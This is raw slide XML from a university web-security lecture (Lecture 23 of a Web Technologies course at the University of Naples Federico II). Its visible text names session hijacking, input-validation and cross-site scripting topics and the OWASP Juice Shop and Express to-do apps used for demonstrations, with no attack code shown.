              <a:rPr dirty="0" sz="2800" spc="-9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20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Attacks</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-11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(Session</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-9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Hijacking)</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="660"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pP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Insufficient</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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Input</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Validation</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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leading</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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to</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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attacks</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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on</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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data</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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integrity</a:t>
            </a:r>
            <a:endParaRPr sz="2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/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="object 5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15570">
              <a:lnSpc>
                <a:spcPts val="1240"/>
              </a:lnSpc>
            </a:pPr>
            <a:fld id="{81D60167-4931-47E6-BA6A-407CBD079E47}" type="slidenum">
              <a:rPr dirty="0" spc="-50"/>
              <a:t>2</a:t>
            </a:fld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62050" y="557529"/>
            <a:ext cx="4122420" cy="57404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85"/>
              <a:t>SUBJECT</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-125"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-135"/>
              <a:t>SYSTEMS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962050" y="1533220"/>
            <a:ext cx="10096500" cy="3818890"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="60325" rIns="0" bIns="0" rtlCol="0" vert="horz">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="240029" marR="5080" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3030"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="475"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pP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We</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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will</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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also</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>demonstrate</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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these</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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attacks</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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on</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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real</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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applications</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>and </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>	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with</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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a</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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modern</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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browser!</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="620"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pP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For</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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some</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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attacks,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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we</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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will</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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use</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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u="sng" sz="2800" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>OWASP</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" u="sng" sz="2800" spc="-45">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" u="sng" sz="2800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>Juice-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" u="sng" sz="2800">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>shop</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="00637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web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>app</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="696595" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="234"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="696595" algn="l"/>
              </a:tabLst>
            </a:pP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Modern</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-7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web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-7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 spc="-25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>app</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="696595" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="215"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="696595" algn="l"/>
              </a:tabLst>
            </a:pP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Angular</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-1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 spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>frontend</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="696595" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="215"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="696595" algn="l"/>
              </a:tabLst>
            </a:pP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Express</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-7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backend</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-7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with</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-8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 spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Sequelize</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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(and</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-8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 spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>more)</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" marR="7620" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3030"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1010"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pP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For</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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others,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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we</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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will</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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use</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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Express</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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95">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>To-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do</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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List</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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traditional</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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app</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>we </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>	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developed</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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back</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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in</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>14</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="696595" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="195"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="696595" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Traditional</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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app</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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implemented</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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using</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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 spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Express</a:t>
            </a:r>
            <a:endParaRPr sz="2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397755" y="22858"/>
            <a:ext cx="5794243" cy="6835139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962050" y="3005708"/>
            <a:ext cx="7307580" cy="75692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4800" spc="175"/>
              <a:t>CROSS-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="4800" spc="-370"/>
              <a:t>SITE</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="4800" spc="140"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="4800" spc="-145"/>
              <a:t>SCRIPTING</a:t>
            </a:r>
            <a:endParaRPr sz="4800"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="object 4" descr=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4117975" y="6335674"/>
            <a:ext cx="3897629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solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-50">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-30">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-30">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-40">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-45">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-30">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-45">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-35">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Federico </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-15">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-15">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="5">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-30">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-5">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-15">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="006379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006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1200" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Security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11127485" y="6427114"/>
            <a:ext cx="10287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50">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>9</a:t>
            </a:r>
            <a:endParaRPr sz="1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/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
